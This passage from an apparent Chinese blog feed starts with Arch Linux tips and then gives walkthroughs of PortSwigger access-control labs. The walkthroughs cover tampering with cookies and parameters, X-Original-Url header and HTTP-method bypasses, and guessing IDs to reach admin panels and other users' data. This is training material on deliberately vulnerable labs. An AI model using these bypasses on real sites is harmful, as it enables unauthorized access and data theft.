安装。尽量不要使用 dpkg，可能会与 pacman 冲突，进而损坏 archlinux 系统。参考：<a href="http://blog.lujun9972.win/blog/2020/02/13/%E5%9C%A8archlinux%E4%B8%8A%E5%AE%89%E8%A3%85deb%E5%8C%85/index.html">在archlinux上安装deb包</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yay -S debtap   # 通过 AUR 安装 debtap</span><br><span class="line">sudo debtap -u  # 更新debtap数据库</span><br><span class="line">debtap xxx.deb  # 使用debtap转换deb包</span><br><span class="line">sudo pacman -U xxx.pkg</span><br></pre></td></tr></table></figure><p>nrich 真难用啊，早知道不装了。</p><h1 id="已）ranger-提示-bin-sh-line-1-vim-command-not-found"><a href="#已）ranger-提示-bin-sh-line-1-vim-command-not-found" class="headerlink" title="已）ranger 提示 &#x2F;bin&#x2F;sh: line 1: vim: command not found"></a>已）ranger 提示 &#x2F;bin&#x2F;sh: line 1: vim: command not found</h1><p>问题描述： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ranger</span><br><span class="line">/bin/sh: line 1: vim: command not found</span><br></pre></td></tr></table></figure><p>解决方法： </p><p>这个问题是因为在使用 ranger 时未更改默认编辑器，默认的编辑器是 <code>/usr/bin/vim</code> 但我使用的是 nvim，默认编辑器通过 <code>$EDITOR</code> 修改。</p><p>仅修改当前用户的 <code>$EDITOR</code>，在 <code>~/.zshrc</code> 中添加一行（如果是 bash 用户，修改 <code>~/.bashrc</code>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export EDITOR=/usr/bin/nvim</span><br></pre></td></tr></table></figure><p>修改所有用户的 <code>$EDITOR</code>，在 <code>/etc/profile.d</code> 目录下创建 <code>editor.sh</code> 并写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export EDITOR=/usr/bin/nvim</span><br></pre></td></tr></table></figure><p>系统启动时会先解析 <code>/etc/profile.d</code> 下的 shell 文件所配置的环境变量，之后再读取用户目录下的配置。</p><h1 id="应用程序安装"><a href="#应用程序安装" class="headerlink" title="应用程序安装"></a>应用程序安装</h1><h2 id="腾讯会议"><a href="#腾讯会议" class="headerlink" title="腾讯会议"></a>腾讯会议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yay -S wemeet-bin</span><br></pre></td></tr></table></figure><h2 id="钉钉"><a href="#钉钉" class="headerlink" title="钉钉"></a>钉钉</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yay -S dingtalk-bin</span><br></pre></td></tr></table></figure><h2 id="微信"><a href="#微信" class="headerlink" title="微信"></a>微信</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yay -S com.qq.weixin.spark</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/linux/">linux</category>
      
      
      <comments>https://by-musi.github.io/2024/02/20/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91--archlinux/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>PortSwigger access control Labs</title>
      <link>https://by-musi.github.io/2024/02/20/PortSwigger_access_control_Labs/</link>
      <guid>https://by-musi.github.io/2024/02/20/PortSwigger_access_control_Labs/</guid>
      <pubDate>Mon, 19 Feb 2024 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-Lab-Unprotected-admin-functionality"><a href="#1-Lab-Unprotected-admin-functionality" class="headerlink" title="1 Lab: Unprotected admin functionality"></a>1 Lab: Unprotected admin functionality</h1><p>target: Solve the lab by deleting the user <code>carlos</code>. 删除用户 <code>carlos</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240106161825.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240106161825.png"></a></p><p>根据题目要求，尝试在 <code>robots.txt</code> 中寻找敏感信息。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240106162110.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240106162110.png"></a></p><p>访问该 API，来到管理员面板。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240106162154.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240106162154.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240106162232.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240106162232.png"></a></p><h1 id="2-Lab-Unprotected-admin-functionality-with-unpredictable-URL"><a href="#2-Lab-Unprotected-admin-functionality-with-unpredictable-URL" class="headerlink" title="2 Lab: Unprotected admin functionality with unpredictable URL"></a>2 Lab: Unprotected admin functionality with unpredictable URL</h1><p>后台隐藏在 javascript 中。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107104346.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107104346.png"></a></p><p>访问 url <code>...web-security-academy.net/admin-3h7sno</code> </p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107104533.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107104533.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107104553.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107104553.png"></a></p><h1 id="3-Lab-User-role-controlled-by-request-parameter"><a href="#3-Lab-User-role-controlled-by-request-parameter" class="headerlink" title="3 Lab: User role controlled by request parameter"></a>3 Lab: User role controlled by request parameter</h1><p>目标：访问后台并删除用户 <code>carlos</code><br>credentials: <code>wiener:peter</code></p><p>使用 <code>wiener:peter</code> 并抓包，重放，可以看到包里面设置了 csrf token 和 session</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107105614.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107105614.png"></a></p><p>登录成功后，会进行页面跳转，这里的逻辑可能是：判断 <code>Admin</code> 参数来决定跳转的页面。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107105801.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107105801.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107110032.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107110032.png"></a></p><p>思路：修改所有请求报文中的 cookie 参数 <code>Admin=ture</code> </p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107110145.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107110145.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107110205.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107110205.png"></a></p><p>重新登录，抓包，改包</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107110527.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107110527.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107110821.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107110821.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107111149.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107111149.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107111254.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107111254.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107111335.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107111335.png"></a></p><h1 id="4-Lab-User-role-can-be-modified-in-user-profile"><a href="#4-Lab-User-role-can-be-modified-in-user-profile" class="headerlink" title="4 Lab: User role can be modified in user profile"></a>4 Lab: User role can be modified in user profile</h1><p>根据题意，请求 <code>/admin</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107113007.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107113007.png"></a></p><blockquote><p>[!question] 问题<br>如何修改 <code>user role</code>？抓包的结果里面也没地方传参数 <code>roleid=2</code> 呀！</p><p><strong>答：</strong> 修改邮箱的时候以 json 格式传输 <code>roleid</code>，<strong>注意枚举输入向量</strong></p></blockquote><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107155013.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107155013.png"></a></p><p>响应报文提示，<code>roleid</code> 已被修改：</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107155233.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107155233.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107155158.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107155158.png"></a></p><p>进入 Admin panel 删除用户 <code>carlos</code>，拿下。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107155506.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107155506.png"></a></p><h1 id="5-Lab-URL-based-access-control-can-be-circumvented"><a href="#5-Lab-URL-based-access-control-can-be-circumvented" class="headerlink" title="5 Lab: URL-based access control can be circumvented"></a>5 Lab: URL-based access control can be circumvented</h1><p>抓包重放</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107160619.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107160619.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107160636.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107160636.png"></a></p><blockquote><p>[!note]<br>Notice that the response is very <strong>plain</strong>, suggesting it may originate from <strong>a front-end system</strong>.<br>响应里面啥也没有，说明它可能是来自前端</p></blockquote><p>更改 HTTP 请求头：<code>X-Original-Url: /admin</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107162239.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107162239.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107162253.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107162253.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107162604.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107162604.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107162620.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107162620.png"></a></p><p>提示 <code>Missing parameter &#39;username&#39;</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107162748.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107162748.png"></a></p><p>将参数单拎出来，响应报文提示 302 重定向，说明删除用户的操作可能成功了。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107163333.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107163333.png"></a></p><p>抓包，改包，删用户，删除用户之后重定向到 <code>/admin</code> 时还需要改一下报文，成功。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240107163300.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240107163300.png"></a></p><p>官方 solution 在中间加了一步，判断后端是否会处理 <code>X-Original-Url</code> 头。</p><blockquote><p>Send the request to Burp Repeater. Change the URL in the request line to <code>/</code> and add the HTTP header <code>X-Original-URL: /invalid</code>. Observe that the application returns a “not found” response. This indicates that the back-end system is processing the URL from the <code>X-Original-URL</code> header.</p></blockquote><h1 id="6-Lab-Method-based-access-control-can-be-circumvented"><a href="#6-Lab-Method-based-access-control-can-be-circumvented" class="headerlink" title="6 Lab: Method-based access control can be circumvented"></a>6 Lab: Method-based access control can be circumvented</h1><p><a href="https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented">–&gt; lab</a></p><p>credentials: <code>wiener:peter</code>, <code>administrator:admin</code><br>目标：使用 <code>wiener</code> 登录，并通过 BAC ( break access control ) 将自己提升为 <code>administrator</code> 权限。<br>ps：可以登录 <code>administrator</code> 账号熟悉下提权流程。</p><p>提权流程与 [[#13 Lab Referer-based access control]] 类似。</p><p>登录 <code>administrator</code> 抓包，请求报文使用 POST 方法，直接传递参数 <code>username=carlos&amp;action=upgrade</code> 且无需二次验证等操作，请求的 API 是 <code>/admin-roles</code>。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112212418.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112212418.png"></a></p><p>思路：登录普通用户，使用 POST 方法请求 <code>/admin-roles</code> 接口，并传递参数 <code>username</code> 和 <code>action=upgrade</code>。</p><p>在 url 中传递 GET 参数 <code>id=administrator</code> 后，发现重定向跳转到了登录界面，抓包，观察重定向报文是否暴露敏感信息。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109171946.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109171946.png"></a></p><p>响应报文仅显示了跳转到 login 界面，且未包含其他有效内容。</p><p>“Update email” 抓包，使用 POST 传递参数 <code>email</code>。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112213131.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112213131.png"></a></p><p>修改报文，请求 API <code>/admin-roles</code> 并传递参数 <code>username=wiener&amp;action=upgrade</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112213316.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112213316.png"></a></p><p>响应报文提示 401 Unauthorized</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112213417.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112213417.png"></a></p><p>难道它还要判断这个请求是不是从 <code>/admin</code> 接口过来？需要 <code>Referer</code> 头部包含 <code>/admin</code>？</p><p>再次修改报文，修改 HTTP 请求头 <code>Referer</code>。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112213641.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112213641.png"></a></p><p>得到的响应仍然是 “401 Unauthorized”。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112213417.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112213417.png"></a></p><p>稍微审下题，emmm，有些服务器可能会使用不同的 HTTP 方法处理同样的 action，这里我们把报文改成 GET 请求，再发送。这道题应该不会验证 <code>Referer</code> 头部，我只是懒得改回去了。。。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112214017.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112214017.png"></a></p><p>响应报文显示 302 重定向到 <code>/admin</code> 提权成功。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112165905.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112165905.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112214345.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112214345.png"></a></p><h1 id="7-Lab-User-ID-controlled-by-request-parameter"><a href="#7-Lab-User-ID-controlled-by-request-parameter" class="headerlink" title="7 Lab: User ID controlled by request parameter"></a>7 Lab: User ID controlled by request parameter</h1><p>credentials: <code>wiener:peter</code><br>目标：拿到用户 <code>carlos</code> 的 API key 并提交</p><p>登录后界面<br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240108225448.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240108225448.png"></a></p><p>抓包，重放</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240108231622.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240108231622.png"></a></p><p>直接修改 <code>id=carlos</code>，</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240108231809.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240108231809.png"></a></p><p>在浏览器中修改参数，拿到 API key 并提交</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240108232118.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240108232118.png"></a></p><p>也可以直接复制 burp repeater 响应 中的 API key。 Render 渲染部分好像无法复制 API key，不过可以复制响应 Pretty 或 Raw 中的 API key</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240108232247.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240108232247.png"></a></p><h1 id="8-Lab-User-ID-controlled-by-request-parameter-with-unpredictable-user-IDs"><a href="#8-Lab-User-ID-controlled-by-request-parameter-with-unpredictable-user-IDs" class="headerlink" title="8 Lab: User ID controlled by request parameter, with unpredictable user IDs"></a>8 Lab: User ID controlled by request parameter, with unpredictable user IDs</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109163448.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109163448.png"></a></p><p>抓包发现，这里的用户判断依据是 GUIDs，如果能拿到受害人 <code>carlos</code> 的 GUIDs 就能以受害人的身份访问其敏感数据，如：API key。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109164124.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109164124.png"></a></p><p>那么如何拿到 <code>carlos</code> 的 GUIDs 呢，首先肯定是明确 <code>carlos</code> 出现在那些地方，找了一圈，没发现好友功能。后面发现第一篇 blog 的作者就是 <code>carlos</code>。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109164528.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109164528.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109164554.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109164554.png"></a></p><p>点击作者 <code>carlos</code> 可以查看该作者的其他博客，同时地址栏显示出其 GUIDs。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109165028.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109165028.png"></a></p><p>复制该 GUIDs，并回到 <code>My account</code> 界面，以 <code>carlos</code> 身份拿到其 API key。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109165232.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109165232.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109165426.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109165426.png"></a></p><h1 id="9-Lab-User-ID-controlled-by-request-parameter-with-data-leakage-in-redirect"><a href="#9-Lab-User-ID-controlled-by-request-parameter-with-data-leakage-in-redirect" class="headerlink" title="9 Lab: User ID controlled by request parameter with data leakage in redirect"></a>9 Lab: User ID controlled by request parameter with data leakage in redirect</h1><p><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect">–&gt; lab</a></p><p>首先看一下网站业务，该网站是一个线上商城，</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109165855.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109165855.png"></a></p><p>商品页面也不包含用户 <code>carlos</code> 即受害人的相关信息。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109165932.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109165932.png"></a></p><p>在 <code>My account</code> 界面直接使用 <code>id=carlos</code> 绕过访问控制被重定向到登录页。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109170201.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109170201.png"></a></p><p>修改 id，发送 get 请求，抓包</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109170606.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109170606.png"></a></p><p>得到如下响应报文：</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109170709.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109170709.png"></a></p><p>可以看到虽然是 302 重定向到 login 页面，但响应报文中仍然包含了 <code>carlos</code> 的用户信息，当然也包括 API key。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109170849.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109170849.png"></a></p><h1 id="10-Lab-User-ID-controlled-by-request-parameter-with-password-disclosure"><a href="#10-Lab-User-ID-controlled-by-request-parameter-with-password-disclosure" class="headerlink" title="10 Lab: User ID controlled by request parameter with password disclosure"></a>10 Lab: User ID controlled by request parameter with password disclosure</h1><p><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure">–&gt; lab</a></p><p>目标：获取管理员密码并删除用户 <code>carlos</code><br>credentials: <code>wiener:peter</code></p><p>登录后发现用户当前密码就展示在输入框里</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109215235.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109215235.png"></a></p><p>虽然被隐去了，但在源码中还是可以看到用户当前密码的。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109215307.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109215307.png"></a></p><p>通过修改 GET 参数 <code>id=administrator</code>，绕过访问控制，这里其实算是绕过水平 (horizontal) 访问控制，但是该用户有管理员权限，也能算是垂直 (vertical) 访问控制，也就是所谓的 “<a href="https://portswigger.net/web-security/access-control#horizontal-to-vertical-privilege-escalation">Horizontal to vertical privilege escalation</a>“。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109215455.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109215455.png"></a></p><p>同样我们可以在源码中拿到 <code>administrator</code> 的密码：o84lgfayqhlsesmbgaan。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109215844.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109215844.png"></a></p><p>使用 <code>administrator:o84lgfayqhlsesmbgaan</code> 登录</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109215954.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109215954.png"></a></p><p>删除 <code>carlos</code> 完成 lab.</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109220014.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109220014.png"></a></p><h1 id="11-Lab-Insecure-direct-object-references"><a href="#11-Lab-Insecure-direct-object-references" class="headerlink" title="11 Lab: Insecure direct object references"></a>11 Lab: Insecure direct object references</h1><p><a href="Lab: Insecure direct object references">–&gt; lab</a></p><p>有个聊天机器人。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109221233.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109221233.png"></a></p><p>可以下载聊天内容。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109221254.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109221254.png"></a></p><p>单击 <code>View transcript</code> 后，抓包，发现，调用接口 <code>/download-transcipt</code> 并重定向请求对应的文件</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109222717.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109222717.png"></a></p><p>思路：修改文件名，看看能不能获取到有用的信，如其他用户的聊天日志。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109223721.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109223721.png"></a></p><p>提示 <code>No transcript</code>。。。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109223735.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109223735.png"></a></p><p>不想猜了，直接 Intruder 爆破一下，先爆一下 0-100 的数字作为文件名。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109223655.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109223655.png"></a></p><p>屁也没有，emmm，前面几个还是我自个点 <code>View transcript</code> 生成的。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109223633.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109223633.png"></a></p><p>题目上说把用户的聊天日志存在了<strong>服务端文件系统</strong>中，难道要用到<strong>路径穿越</strong>的东西？ [[路径穿越基础介绍]]</p><p>简单构造了一下文件名 <code>/download-transcript/../../carlos/download-transcript/1.txt</code> 发现并不对。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240109225225.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240109225225.png"></a></p><blockquote><p>[!question] 问题<br><code>carlos</code> 的聊天日志放在哪呢，咋找呢？没法使用 <code>ls</code> 和 <code>pwd</code> 是真的难受。</p></blockquote><p>通过查看 solution，我突然意识到下载的聊天文件的文件名是从 2 开始的，再结合前面爆破的结果，<code>carlos</code> 的聊天文件大概率在 <code>1.txt</code> 中。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112122828.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112122828.png"></a></p><p>（我咋没试过 <code>1.txt</code> 呢，远在天边近在眼前 …</p><p>请求 <code>1.txt</code> </p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112123038.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112123038.png"></a></p><p>在响应报文中的 <code>carlos</code> 聊天文件中获取到了其敏感信息。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112123138.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112123138.png"></a></p><p>登录，lab 解决。</p><blockquote><p>[!note]<br>这个 lab 告诉我们，使用 ChatGPT 的时候，别问过于敏感的问题。</p><p>PS: 我对细节的把握还是差点意思。</p></blockquote><h1 id="12-Lab-Multi-step-process-with-no-access-control-on-one-step"><a href="#12-Lab-Multi-step-process-with-no-access-control-on-one-step" class="headerlink" title="12 Lab: Multi-step process with no access control on one step"></a>12 Lab: Multi-step process with no access control on one step</h1><p><a href="https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step">–&gt; lab</a></p><p>credentials: <code>wiener:peter</code>, <code>administrator:admin</code><br>目标：使用 <code>wiener</code> 登录，并通过 BAC ( break access control ) 将自己提升为 <code>administrator</code> 权限。<br>ps：可以登录 <code>administrator</code> 账号熟悉下提权流程</p><p>admin 提权流程：首先，选择对应用户，这里选 <code>carlos</code>，点击 <code>Upgrade user</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112135409.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112135409.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112170009.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112170009.png"></a></p><p>之后会提示 <code>Are you sure?</code> 点击 <code>Yes</code>，相当于一步验证步骤。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112135557.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112135557.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112165821.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112165821.png"></a></p><p>重定向到 <code>/admin</code> 页面。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112165905.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112165905.png"></a></p><p>提权成功情况如下。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112135658.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112135658.png"></a></p><p>也就是说 提权过程分为三步：</p><ol><li>判断登录用户是否为 administrator </li><li>提交提权请求，即 ‘Upgrade user’</li><li>确认提权请求，’Are you sure?’</li></ol><p>思路: 直接修改第三步操作 “Are you sure” 认证过程的报文，将 <code>username</code> 改为 <code>wiener</code>，从而实现提权。</p><p>下面先在 administrator 用户下修改报文</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112170801.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112170801.png"></a></p><p>响应报文重定向到 <code>/admin</code> 页面，说明大概率成功了。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112171252.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112171252.png"></a></p><p>查看页面。<br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112171217.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112171217.png"></a><br>解题流程：先登录用户 <code>wiener</code></p><p>修改邮件，抓包</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112173035.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112173035.png"></a></p><p>由于这是 post 方法，我们直接尝试修改 API 访问 <code>/admin-roles</code> 并传递参数 